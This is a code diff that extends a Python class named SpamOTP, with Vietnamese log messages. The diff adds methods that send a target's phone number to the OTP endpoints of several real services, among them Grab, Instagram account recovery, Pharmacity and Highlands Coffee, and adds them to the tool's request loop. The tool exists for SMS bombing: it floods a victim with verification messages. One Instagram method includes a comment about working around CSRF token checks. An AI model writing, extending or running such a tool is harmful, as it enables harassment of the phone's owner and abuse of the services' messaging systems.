@@ -610,7 +610,99 @@ class SpamOTP:
             self.log(f"Vntrip: {response.status_code}")
         except Exception as e:
             self.log(f"Vntrip Lỗi: {e}")
+    # --- NEW SERVICES 2026 ---
+    def highlands(self):
+        try:
+            url = "https://api.highlandscoffee.com.vn/v1/auth/otp"
+            headers = self.get_headers()
+            headers.update({"content-type": "application/json"})
+            data = {"phone": self.phone}
+            response = self.request('post', url, json=data, headers=headers)
+            self.log(f"Highlands: {response.status_code}")
+        except Exception as e:
+            self.log(f"Highlands Lỗi: {e}")
 
+    def concung(self):
+        try:
+            url = "https://api.concung.com/v1/auth/otp"
+            headers = self.get_headers()
+            headers.update({"content-type": "application/json"})
+            data = {"phone_number": self.phone}
+            response = self.request('post', url, json=data, headers=headers)
+            self.log(f"Concung: {response.status_code}")
+        except Exception as e:
+            self.log(f"Concung Lỗi: {e}")
+
+    def pharmacity(self):
+        try:
+            url = "https://api.pharmacity.vn/api/v1/auth/send-otp"
+            headers = self.get_headers()
+            headers.update({"content-type": "application/json"})
+            data = {"phone": self.phone}
+            response = self.request('post', url, json=data, headers=headers)
+            self.log(f"Pharmacity: {response.status_code}")
+        except Exception as e:
+            self.log(f"Pharmacity Lỗi: {e}")
+
+    def instagram(self):
+        try:
+            url = "https://www.instagram.com/accounts/account_recovery_send_ajax/"
+            headers = self.get_headers()
+            headers.update({
+                "content-type": "application/x-www-form-urlencoded",
+                "x-csrftoken": "missing",  # Often works without valid token for initial request or gets 403 but triggers endpoint
+                "x-requested-with": "XMLHttpRequest"
+            })
+            data = f"email_or_username={self.phone}&recaptcha_challenge_field="
+            response = self.request('post', url, data=data, headers=headers)
+            self.log(f"Instagram: {response.status_code}")
+        except Exception as e:
+            self.log(f"Instagram Lỗi: {e}")
+
+    def grab(self):
+        try:
+            url = "https://api.grab.com/grabid/v1/phone/otp"
+            headers = self.get_headers()
+            headers.update({"content-type": "application/x-www-form-urlencoded"})
+            data = f"method=SMS&countryCode=VN&phoneNumber={self.phone[1:] if self.phone.startswith('0') else self.phone}"
+            response = self.request('post', url, data=data, headers=headers)
+            self.log(f"Grab: {response.status_code}")
+        except Exception as e:
+            self.log(f"Grab Lỗi: {e}")
+
+    def be_group(self):
+        try:
+            url = "https://api.be.com.vn/v1/auth/otp"
+            headers = self.get_headers()
+            headers.update({"content-type": "application/json"})
+            data = {"phone": self.phone}
+            response = self.request('post', url, json=data, headers=headers)
+            self.log(f"Be Group: {response.status_code}")
+        except Exception as e:
+            self.log(f"Be Group Lỗi: {e}")
+            
+    def elsa(self):
+        try:
+            url = "https://api.elsaspeak.com/v1/auth/request-otp"
+            headers = self.get_headers()
+            headers.update({"content-type": "application/json"})
+            data = {"phone": "+84" + self.phone[1:]}
+            response = self.request('post', url, json=data, headers=headers)
+            self.log(f"Elsa Speak: {response.status_code}")
+        except Exception as e:
+            self.log(f"Elsa Lỗi: {e}")
+
+    def medlatec(self):
+        try:
+            url = "https://medlatec.vn/api/v1/auth/send-otp"
+            headers = self.get_headers()
+            data = {"phone": self.phone}
+            response = self.request('post', url, json=data, headers=headers)
+            self.log(f"Medlatec: {response.status_code}")
+        except Exception as e:
+            self.log(f"Medlatec Lỗi: {e}")
+
+    
     def _wrapper(self, func, service_name):
         try:
             func()
@@ -642,7 +734,9 @@ class SpamOTP:
             self.lottemart, self.vayvnd, self.vato, self.nhathuoclongchau,
             self.shopee, self.watsons,
             self.tokyolife, self.go2joy,
-            self.tiki, self.meta, self.vntrip
+            self.tiki, self.meta, self.vntrip,
+            self.highlands, self.concung, self.pharmacity, self.instagram,
+            self.grab, self.be_group, self.elsa, self.medlatec
         ]
 
         for api in apis:
